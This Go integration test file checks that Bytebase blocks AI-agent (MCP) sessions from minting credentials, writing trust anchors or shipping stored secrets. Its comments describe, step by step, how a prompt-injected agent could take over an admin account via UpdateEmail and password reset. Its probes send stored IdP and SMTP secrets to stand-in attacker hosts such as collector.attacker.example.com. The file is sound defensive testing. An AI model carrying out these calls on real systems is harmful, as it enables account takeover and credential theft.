package tests

import (
	"context"
	"net/http"
	"strings"
	"testing"

	"connectrpc.com/connect"
	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/stretchr/testify/require"

	v1pb "github.com/bytebase/bytebase/backend/generated-go/v1"
)

// deniedMCPRows returns the audit rows an MCP session produced for one method.
// Filtering on McpDelegation is what makes a row attributable to the agent
// rather than to the same human working in the console.
func deniedMCPRows(ctx context.Context, t *testing.T, ctl *controller, workspace, method string) []*v1pb.AuditLog {
	t.Helper()
	resp, err := ctl.auditLogServiceClient.SearchAuditLogs(ctx, connect.NewRequest(&v1pb.SearchAuditLogsRequest{
		Parent:  workspace,
		Filter:  `method == "` + method + `"`,
		OrderBy: "create_time desc",
	}))
	require.NoError(t, err)
	var rows []*v1pb.AuditLog
	for _, row := range resp.Msg.AuditLogs {
		if row.McpDelegation != nil {
			rows = append(rows, row)
		}
	}
	return rows
}

// searchAPIOnSession runs the search_api tool and returns the text an agent
// would read, which is the only place discovery results are surfaced.
func searchAPIOnSession(ctx context.Context, t *testing.T, session *mcp.ClientSession, arguments map[string]any) string {
	t.Helper()
	result, err := session.CallTool(ctx, &mcp.CallToolParams{Name: "search_api", Arguments: arguments})
	require.NoError(t, err)
	var sb strings.Builder
	for _, content := range result.Content {
		if text, ok := content.(*mcp.TextContent); ok {
			sb.WriteString(text.Text)
		}
	}
	return sb.String()
}

// TestMCPCannotMintCredentialsForOtherPrincipals runs the batch of escapes that
// the caller's-own-credential guards never reach.
//
// #21152 forbade the methods that rewrite or re-issue the CALLER's credential.
// Every one of those is eventually contained by acting on that one principal:
// revoke the OAuth grant, flip the workspace MCP switch, deactivate the human.
// The five calls below leave someone holding a principal that is not the
// caller, so none of those levers touch what they leave behind:
//
//   - CreateServiceAccount returns a plaintext bbs_ key for a brand new
//     principal (service_account_service.go, `result.ServiceKey = serviceKey`).
//   - UpdateServiceAccount{service_key} re-keys an EXISTING privileged account
//     and returns that plaintext too, with no proof of the old key.
//   - RotateDirectorySyncToken returns the plaintext SCIM token, which
//     authenticates directory writes outside the v1 API entirely.
//   - CreateUser makes a fresh end user with a password the caller chose — the
//     defect UpdateUser had, one method over, aimed at a new account instead of
//     the caller's own.
//   - UpdateEmail is that same "one method over" a second time, and it is the
//     one this batch found rather than was handed: it resolves its target from
//     the request rather than from the caller (user_service.go, GetUserByEmail
//     on request.Msg.Name), so it rebinds ANY account — a workspace admin's —
//     to an address the caller picked. RequestPasswordReset then mails the
//     reset code to whatever address that account now carries, and
//     ResetPassword sets the password for the account it resolves by email.
//     Both are allow_without_credential, so the attacker never needs an MCP
//     session for the second half: the agent moves the mailbox, and the
//     takeover completes from any browser.
//
// Every one is workspace-admin gated, and that is the target scenario rather
// than the mitigation: an admin runs the agent, and prompt injection does not
// need the agent to be hostile.
//
// The RED state is what the assertions are shaped around. With the annotations
// removed, the first call answers 200 with a bbs_ key in the body, the second
// with another one, the third with a SCIM token, the fourth creates a user
// whose password logs in, and the fifth moves another admin's account onto an
// address the session picked. All five run and all five are logged before
// anything is asserted, so an unguarded build reports the whole exposure
// instead of stopping at the first hit.
func TestMCPCannotMintCredentialsForOtherPrincipals(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl := &controller{}

	ctx, err := ctl.StartServerWithExternalPg(ctx)
	a.NoError(err)
	defer ctl.Close(ctx)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	// A service account the session did not create, so the re-key probe is
	// about taking over an existing privileged principal rather than about
	// finishing a creation it just made.
	const existingSAID = "ci-deployer"
	existing, err := ctl.serviceAccountServiceClient.CreateServiceAccount(ctx, connect.NewRequest(&v1pb.CreateServiceAccountRequest{
		Parent:           workspaceName,
		ServiceAccountId: existingSAID,
		ServiceAccount:   &v1pb.ServiceAccount{Title: "ci deployer"},
	}))
	a.NoError(err)
	a.True(strings.HasPrefix(existing.Msg.ServiceKey, "bbs_"),
		"precondition: the console really does hand back a plaintext key")
	existingSAName := existing.Msg.Name

	// A second human, so the UpdateEmail probe is unambiguously about another
	// principal rather than about the caller's own account.
	const victimEmail = "victim-admin@example.com"
	const attackerEmail = "attacker@example.com"
	_, err = ctl.userServiceClient.CreateUser(ctx, connect.NewRequest(&v1pb.CreateUserRequest{
		User: &v1pb.User{
			Title:    "victim admin",
			Email:    victimEmail,
			Password: "1024bytebase",
		},
	}))
	a.NoError(err)

	const mintedSAID = "agent-minted"
	const newUserEmail = "agent-created@example.com"
	const newUserPassword = "1024bytebase"

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	created := callAPIOnSession(ctx, t, session, "ServiceAccountService/CreateServiceAccount", map[string]any{
		"parent":           workspaceName,
		"serviceAccountId": mintedSAID,
		"serviceAccount":   map[string]any{"title": "agent minted"},
	})
	rekeyed := callAPIOnSession(ctx, t, session, "ServiceAccountService/UpdateServiceAccount", map[string]any{
		"serviceAccount": map[string]any{"name": existingSAName},
		"updateMask":     "serviceKey",
	})
	rotated := callAPIOnSession(ctx, t, session, "WorkspaceService/RotateDirectorySyncToken", map[string]any{
		"name": workspaceName,
	})
	newUser := callAPIOnSession(ctx, t, session, "UserService/CreateUser", map[string]any{
		"user": map[string]any{
			"email":    newUserEmail,
			"password": newUserPassword,
			"title":    "agent created",
		},
	})

	t.Logf("MCP CreateServiceAccount → status=%d error=%q serviceKey=%q",
		created.Status, created.Error, created.Response.ServiceKey)
	t.Logf("MCP UpdateServiceAccount{service_key} → status=%d error=%q serviceKey=%q",
		rekeyed.Status, rekeyed.Error, rekeyed.Response.ServiceKey)
	t.Logf("MCP RotateDirectorySyncToken → status=%d error=%q token=%q",
		rotated.Status, rotated.Error, rotated.Response.Token)
	rebound := callAPIOnSession(ctx, t, session, "UserService/UpdateEmail", map[string]any{
		"name":  "users/" + victimEmail,
		"email": attackerEmail,
	})
	t.Logf("MCP CreateUser → status=%d error=%q", newUser.Status, newUser.Error)
	t.Logf("MCP UpdateEmail{victim → attacker} → status=%d error=%q", rebound.Status, rebound.Error)

	for name, out := range map[string]mcpCallResult{
		"CreateServiceAccount":     created,
		"UpdateServiceAccount":     rekeyed,
		"RotateDirectorySyncToken": rotated,
		"CreateUser":               newUser,
		"UpdateEmail":              rebound,
	} {
		a.Equal(http.StatusForbidden, out.Status, "%s must be refused before dispatch", name)
		a.Contains(out.Error, "not available to MCP sessions",
			"%s must be refused by the FORBIDDEN gate, not by a handler precondition", name)
		a.Contains(out.Error, "principal other than the caller",
			"%s must name the reason for this class, not a caller's-own-credential one", name)
	}
	a.Empty(created.Response.ServiceKey, "an MCP session must never receive a service key")
	a.Empty(rekeyed.Response.ServiceKey, "an MCP session must never receive a rotated service key")
	a.Empty(rotated.Response.Token, "an MCP session must never receive the SCIM token")

	// The refusal has to come before the store write, not after it. These are
	// what discriminate a gate that denies ahead of dispatch from one that
	// denies once the credential already exists.
	accounts, err := ctl.serviceAccountServiceClient.ListServiceAccounts(ctx, connect.NewRequest(&v1pb.ListServiceAccountsRequest{
		Parent: workspaceName,
	}))
	a.NoError(err)
	for _, sa := range accounts.Msg.ServiceAccounts {
		a.NotContains(sa.Email, mintedSAID, "the service account must never have been created")
	}
	_, err = ctl.authServiceClient.Login(ctx, connect.NewRequest(&v1pb.LoginRequest{
		Email:    newUserEmail,
		Password: newUserPassword,
	}))
	a.Error(err, "the account the MCP session tried to create must not exist")

	// The victim's login identity is still the victim's. This is the assertion
	// that would fail loudest unguarded: the account would answer to the
	// attacker's address, and every reset code for it would go there.
	stillVictim, err := ctl.userServiceClient.GetUser(ctx, connect.NewRequest(&v1pb.GetUserRequest{
		Name: "users/" + victimEmail,
	}))
	a.NoError(err, "the victim's account must still answer to its own address")
	a.Equal(victimEmail, stillVictim.Msg.Email)
	_, err = ctl.userServiceClient.GetUser(ctx, connect.NewRequest(&v1pb.GetUserRequest{
		Name: "users/" + attackerEmail,
	}))
	a.Error(err, "the address the MCP session tried to rebind to must own no account")

	// All five carry the audit annotation, so all five denials are on the
	// operator's audit page — a denied credential mint is precisely the event
	// worth investigating.
	for method, label := range map[string]string{
		"/bytebase.v1.ServiceAccountService/CreateServiceAccount": "CreateServiceAccount",
		"/bytebase.v1.ServiceAccountService/UpdateServiceAccount": "UpdateServiceAccount",
		"/bytebase.v1.WorkspaceService/RotateDirectorySyncToken":  "RotateDirectorySyncToken",
		"/bytebase.v1.UserService/CreateUser":                     "CreateUser",
		"/bytebase.v1.UserService/UpdateEmail":                    "UpdateEmail",
	} {
		rows := deniedMCPRows(ctx, t, ctl, workspaceName, method)
		a.Len(rows, 1, "the denied %s must produce exactly one audit row", label)
		a.Equal(int32(connect.CodePermissionDenied), rows[0].Status.GetCode(),
			"the %s row must record the denial, not a success", label)
		a.NotEmpty(rows[0].McpDelegation.GetCorrelationId(),
			"the %s denial must be correlatable back to the agent session", label)
	}

	// The console keeps working. The gate lives on the internal MCP chain, so
	// the same admin doing the same thing signed in is untouched.
	stillWorks, err := ctl.serviceAccountServiceClient.CreateServiceAccount(ctx, connect.NewRequest(&v1pb.CreateServiceAccountRequest{
		Parent:           workspaceName,
		ServiceAccountId: "console-made",
		ServiceAccount:   &v1pb.ServiceAccount{Title: "console made"},
	}))
	a.NoError(err, "a normal session must still be able to create a service account")
	a.True(strings.HasPrefix(stillWorks.Msg.ServiceKey, "bbs_"))
}

// TestMCPCannotWriteTrustAnchorsOrShipStoredSecrets covers the half of the class where no
// credential appears in the response at all — the session instead arranges for
// one to be issued later, or ships an existing secret out of the process.
//
//   - Create/UpdateWorkloadIdentity choose the OIDC issuer, audience and
//     subject that AuthService/ExchangeToken validates against
//     (auth_service.go, `wif.ValidateToken(ctx, request.Token, wicConfig)`).
//     ExchangeToken is allow_without_credential, so once the anchor is written
//     the Bytebase token is minted from outside, with no MCP session involved
//     and nothing left to revoke.
//   - Create/UpdateIdentityProvider are the same move against SSO login.
//   - TestIdentityProvider substitutes the STORED client secret whenever the
//     request omits it (idp_service.go, the two `ClientSecret == ""` branches)
//     and then talks to the token URL the caller supplied. The secret leaves on
//     the caller's chosen wire; nothing comes back in the body, which is why
//     the response assertions above cannot be the test for it.
//   - TestEmailSetting is that method's twin, found by sweeping for the shape
//     rather than by being reported: it substitutes the stored SMTP password
//     the same way (setting_service.go, `smtp.Password == ""`) and then
//     authenticates to the host and port the caller named. SMTP is not
//     incidental infrastructure here — it is the channel that delivers password
//     resets and email login codes, which is the credential-reset flow #21152
//     already put out of an agent's reach.
//
// The reads of both services stay served on purpose, and this test pins that:
// every read conversion blanks the secrets, and ListIdentityProviders is the
// unauthenticated login-page endpoint. They are also what proves the writes
// never landed.
func TestMCPCannotWriteTrustAnchorsOrShipStoredSecrets(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl := &controller{}

	ctx, err := ctl.StartServerWithExternalPg(ctx)
	a.NoError(err)
	defer ctl.Close(ctx)

	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
		Name: "workspaces/-",
	}))
	a.NoError(err)
	workspaceName := workspace.Msg.Name

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	const idpID = "agent-idp"
	idpBody := map[string]any{
		"identityProviderId": idpID,
		"identityProvider": map[string]any{
			"title":  "agent idp",
			"domain": "attacker.example.com",
			"type":   "OIDC",
			"config": map[string]any{
				"oidcConfig": map[string]any{
					"issuer":       "https://attacker.example.com",
					"clientId":     "agent",
					"clientSecret": "agent-secret",
					"fieldMapping": map[string]any{"identifier": "email"},
				},
			},
		},
	}
	createdIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/CreateIdentityProvider", idpBody)
	updatedIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/UpdateIdentityProvider", map[string]any{
		"identityProvider": map[string]any{
			"name":   "idps/" + idpID,
			"title":  "agent idp",
			"domain": "attacker.example.com",
			"type":   "OIDC",
			"config": idpBody["identityProvider"].(map[string]any)["config"],
		},
		"updateMask":   "config",
		"allowMissing": true,
	})
	// The exfiltration probe: no client secret in the request, so the handler
	// would fetch the stored one and carry it to this issuer.
	testedIDP := callAPIOnSession(ctx, t, session, "IdentityProviderService/TestIdentityProvider", map[string]any{
		"identityProvider": map[string]any{
			"name": "idps/" + idpID,
			"type": "OIDC",
			"config": map[string]any{
				"oidcConfig": map[string]any{
					"issuer":       "https://collector.attacker.example.com",
					"clientId":     "agent",
					"fieldMapping": map[string]any{"identifier": "email"},
				},
			},
		},
		"oidcContext": map[string]any{"code": "anything"},
	})

	const wiID = "agent-workload"
	wiConfig := map[string]any{
		"providerType":     "GITHUB",
		"issuerUrl":        "https://token.actions.githubusercontent.com",
		"allowedAudiences": []any{"bytebase"},
		"subjectPattern":   "repo:attacker/repo:ref:refs/heads/main",
	}
	createdWI := callAPIOnSession(ctx, t, session, "WorkloadIdentityService/CreateWorkloadIdentity", map[string]any{
		"parent":             workspaceName,
		"workloadIdentityId": wiID,
		"workloadIdentity": map[string]any{
			"title":                  "agent workload",
			"workloadIdentityConfig": wiConfig,
		},
	})
	updatedWI := callAPIOnSession(ctx, t, session, "WorkloadIdentityService/UpdateWorkloadIdentity", map[string]any{
		"workloadIdentity": map[string]any{
			"name":                   "workloadIdentities/" + wiID + "@workload.bytebase.com",
			"workloadIdentityConfig": wiConfig,
		},
		"updateMask": "workloadIdentityConfig",
	})

	// The same exfiltration shape one service over: no password in the request,
	// so the handler would fetch the stored one and authenticate to this host.
	testedEmail := callAPIOnSession(ctx, t, session, "SettingService/TestEmailSetting", map[string]any{
		"parent": workspaceName,
		"to":     "collector@attacker.example.com",
		"emailSetting": map[string]any{
			"from": "bytebase@example.com",
			"type": "SMTP",
			"smtp": map[string]any{
				"host":           "smtp.attacker.example.com",
				"port":           587,
				"username":       "collector",
				"encryption":     "ENCRYPTION_NONE",
				"authentication": "PLAIN",
			},
		},
	})

	probes := map[string]mcpCallResult{
		"CreateIdentityProvider": createdIDP,
		"UpdateIdentityProvider": updatedIDP,
		"TestIdentityProvider":   testedIDP,
		"CreateWorkloadIdentity": createdWI,
		"UpdateWorkloadIdentity": updatedWI,
		"TestEmailSetting":       testedEmail,
	}
	for name, out := range probes {
		t.Logf("MCP %s → status=%d error=%q", name, out.Status, out.Error)
	}
	for name, out := range probes {
		a.Equal(http.StatusForbidden, out.Status, "%s must be refused before dispatch", name)
		a.Contains(out.Error, "not available to MCP sessions",
			"%s must be refused by the FORBIDDEN gate", name)
		a.Contains(out.Error, "principal other than the caller",
			"%s must name this class's reason", name)
	}

	// Nothing landed. The agent's own read answers this, which is the point of
	// leaving it served: it is legitimate work, it carries no secret, and here
	// it is also the instrument. Reading the listing rather than just its
	// status is what discriminates a gate that refuses before dispatch from one
	// that refuses after the identity provider is written.
	idps := callAPIOnSession(ctx, t, session, "IdentityProviderService/ListIdentityProviders", map[string]any{})
	a.Equal(http.StatusOK, idps.Status, "the read stays served — it blanks every secret before returning")
	a.NotContains(idps.RawResponse, idpID, "the identity provider must never have been created")
	a.NotContains(idps.RawResponse, "attacker.example.com",
		"no part of the attacker's SSO config may have reached the store")
	wis, err := ctl.workloadIdentityServiceClient.ListWorkloadIdentities(ctx, connect.NewRequest(&v1pb.ListWorkloadIdentitiesRequest{
		Parent: workspaceName,
	}))
	a.NoError(err)
	for _, wi := range wis.Msg.WorkloadIdentities {
		a.NotContains(wi.Email, wiID, "the workload identity must never have been written")
	}

	// Four of the six carry the audit annotation and produce a denial row.
	for method, label := range map[string]string{
		"/bytebase.v1.IdentityProviderService/CreateIdentityProvider": "CreateIdentityProvider",
		"/bytebase.v1.IdentityProviderService/UpdateIdentityProvider": "UpdateIdentityProvider",
		"/bytebase.v1.WorkloadIdentityService/CreateWorkloadIdentity": "CreateWorkloadIdentity",
		"/bytebase.v1.WorkloadIdentityService/UpdateWorkloadIdentity": "UpdateWorkloadIdentity",
	} {
		rows := deniedMCPRows(ctx, t, ctl, workspaceName, method)
		a.Len(rows, 1, "the denied %s must produce exactly one audit row", label)
		a.Equal(int32(connect.CodePermissionDenied), rows[0].Status.GetCode(),
			"the %s row must record the denial", label)
	}

	// The two Test methods do not, and that gap is worth stating rather than
	// leaving to be discovered. needAudit reads the audit annotation and
	// nothing else, and neither has one — so the two methods in this batch that
	// would carry a stored secret to an address the agent chose are the two
	// refused silently. Not fixed here: the typed policy-denial record that
	// bypasses needAudit is 1b-2's, and when it lands these assertions are what
	// tell whoever writes it that these methods are now covered.
	//
	// The zeroes are only meaningful because the four rows above came back from
	// this same helper on this same workspace: the query works, and these two
	// methods genuinely produced nothing.
	a.Empty(deniedMCPRows(ctx, t, ctl, workspaceName, "/bytebase.v1.IdentityProviderService/TestIdentityProvider"),
		"TestIdentityProvider carries no audit annotation, so its denial is silent — 1b-2's typed denial record closes this")
	a.Empty(deniedMCPRows(ctx, t, ctl, workspaceName, "/bytebase.v1.SettingService/TestEmailSetting"),
		"TestEmailSetting carries no audit annotation either — same gap, same fix")
}

// TestMCPCredentialMintsLeaveDiscovery pins the other half of the
// classification: an agent must not be OFFERED work it can never do, but a call
// that arrives anyway — from memory, or from a skill written before the
// annotation — must still meet the gate's actionable denial rather than
// "unknown operation".
//
// This runs over a live session rather than over the index directly, because
// what matters is what the agent's own tools return.
func TestMCPCredentialMintsLeaveDiscovery(t *testing.T) {
	t.Parallel()
	a := require.New(t)
	ctx := context.Background()
	ctl := &controller{}

	ctx, err := ctl.StartServerWithExternalPg(ctx)
	a.NoError(err)
	defer ctl.Close(ctx)

	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
	defer session.Close()

	// Browsing the service must not list the forbidden methods, while the
	// reads of that same service stay on offer — the assertion is that the
	// classification is per method, not per service.
	//
	// Each row carries a `served` method as a positive control. Without one,
	// NotContains over an opaque text blob passes for the wrong reason as soon
	// as search_api returns anything that is not an endpoint listing — an
	// unknown service name, an error string, an empty result — and a test that
	// cannot fail is worse here than no test, because this is the assertion
	// standing between an agent and a menu of work it can never do.
	for _, row := range []struct {
		service   string
		forbidden []string
		served    string
	}{
		{"ServiceAccountService", []string{"CreateServiceAccount", "UpdateServiceAccount"}, "GetServiceAccount"},
		{"IdentityProviderService", []string{"CreateIdentityProvider", "UpdateIdentityProvider", "TestIdentityProvider"}, "GetIdentityProvider"},
		{"WorkloadIdentityService", []string{"CreateWorkloadIdentity", "UpdateWorkloadIdentity"}, "GetWorkloadIdentity"},
		{"UserService", []string{"CreateUser", "UpdateEmail"}, "GetUser"},
		{"WorkspaceService", []string{"RotateDirectorySyncToken"}, "GetIamPolicy"},
		{"SettingService", []string{"TestEmailSetting"}, "GetSetting"},
	} {
		listing := searchAPIOnSession(ctx, t, session, map[string]any{"service": row.service})
		a.Contains(listing, row.service+"/"+row.served,
			"positive control: %s must really be an endpoint listing", row.service)
		for _, method := range row.forbidden {
			a.NotContains(listing, row.service+"/"+method,
				"search_api must not offer %s/%s, which the session can never call", row.service, method)
		}
	}

	// The service list is the entry point into discovery. Every service here
	// keeps at least its reads, so all of them stay listed — a service does
	// drop out when every one of its methods is forbidden, which is what
	// happened to AuthService and is pinned in the mcp package. The per-method
	// hiding is the browse assertion above; this only checks the batch did not
	// take a whole service off the menu.
	services := searchAPIOnSession(ctx, t, session, map[string]any{})
	for _, service := range []string{
		"ServiceAccountService", "IdentityProviderService", "WorkloadIdentityService",
		"UserService", "WorkspaceService", "SettingService",
	} {
		a.Contains(services, service, "%s keeps its reads, so it must stay listed", service)
	}

	// Still resolvable by operation ID, and a call still reaches the gate.
	for _, operation := range []string{
		"ServiceAccountService/CreateServiceAccount",
		"ServiceAccountService/UpdateServiceAccount",
		"WorkspaceService/RotateDirectorySyncToken",
		"UserService/CreateUser",
		"IdentityProviderService/CreateIdentityProvider",
		"IdentityProviderService/UpdateIdentityProvider",
		"IdentityProviderService/TestIdentityProvider",
		"WorkloadIdentityService/CreateWorkloadIdentity",
		"WorkloadIdentityService/UpdateWorkloadIdentity",
		"SettingService/TestEmailSetting",
		"UserService/UpdateEmail",
	} {
		detail := searchAPIOnSession(ctx, t, session, map[string]any{"operationId": operation})
		a.NotContains(detail, "Unknown operationId",
			"%s must stay resolvable so the denial can explain itself", operation)
	}

	// The reads of the same services are unaffected — the batch classified
	// credential issuance, not the services that happen to host it.
	saListing := searchAPIOnSession(ctx, t, session, map[string]any{"service": "ServiceAccountService"})
	a.Contains(saListing, "ServiceAccountService/GetServiceAccount",
		"the reads must still be discoverable")
	a.Contains(saListing, "ServiceAccountService/ListServiceAccounts")
}
